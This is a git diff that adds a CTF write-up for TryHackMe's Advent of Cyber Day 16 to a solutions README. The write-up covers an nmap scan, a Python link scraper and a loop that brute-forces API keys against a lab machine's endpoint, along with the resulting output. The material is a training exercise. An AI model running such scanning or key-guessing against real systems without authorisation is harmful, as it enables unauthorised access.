@@ -21,7 +21,7 @@ Event Homepage: [`https://tryhackme.com/christmas`](https://tryhackme.com/christ
 - [x] [Day 13 - Coal for Christmas](#day-13-coal-for-christmas)
 - [x] [Day 14 - Where's Rudolph?](#day-14-wheres-rudolph)
 - [x] [Day 15 - There's a Python in my stocking!](#day-15-theres-a-python-in-my-stocking)
-- [ ] Day 16 - Help! Where is Santa?
+- [x] [Day 16 - Help! Where is Santa?](#day-16-help-where-is-santa)
 - [ ] Day 17 - ReverseELFneering
 - [ ] Day 18 - The Bits of the Christmas
 - [ ] Day 19 - The Naughty or Nice List
@@ -1619,3 +1619,76 @@ bluemoon@dragonfly:~/ctf/thm/thm-advent/day15-theres-a-python-in-my-stocking$ py
 #### What causes the previous task to output that?
 
 In Python, and many other languages, lists are just a pointer to an address in memory and when we set one list equal to another we are pointing to the same list in memory. This is called `pass by reference`.
+
+## Day 16: Help! Where is Santa?
+
+*Category: Scripting*
+*Tags: Requests*
+
+>Santa appears to have accidentally told Rudolph to take off, leaving the elves stranded! Utilise Python and the power of APIs to track where Santa is, and help the elves get back to their sleigh!
+
+IP: `10.10.135.149`
+
+### Basic enumeration
+
+Firstly, let's run the Nmap scan!
+
+```
+nmap -sC -sV -vvv -oN nmap.log 10.10.135.149
+```
+
+We see that the web server is running on port `8000`.
+
+### Visiting the webpage
+
+We type `http://10.10.135.149:8000/static/index.html` into the webpage and we find the following.
+
+![screenshot](day16-help-where-is-santa/index.png)
+
+### Finding Santa's Location
+
+Well, we could just view the page source to find the correct link, I reckon we could do it much easier in with Python.
+
+```py
+import requests as r
+from bs4 import BeautifulSoup
+
+url = "http://10.10.135.149:8000"
+
+page = r.get(url)
+page = BeautifulSoup(page.text, "html.parser")
+
+links = page.find_all("a")
+for i in links:
+    if i.get("href") not in ["#", "https://tryhackme.com"]:
+        print(i.get("href"))
+```
+
+We find that the secret link is `http://machine_ip/api/api_key`
+
+### Finding the API endpoint
+
+We can find the API endpoint at `10.10.135.149:8000/api/`
+
+### Finding Santa's Location
+
+To find the API key, I wrote a simple Python script.
+
+```py
+import requests as r
+
+url = "http://10.10.135.149:8000/api/"
+
+for i in range(1, 100, 2):
+    response = r.get(url + str(i))
+    if 'Error. Key not valid!' not in response.text:
+        print(f"API Key: {i}")
+        print(response.text)
+```
+
+And we get the following output:
+
+```
+API Key: 57
+{"item_id":57,"q":"Winter Wonderland, Hyde Park, London."}
+```
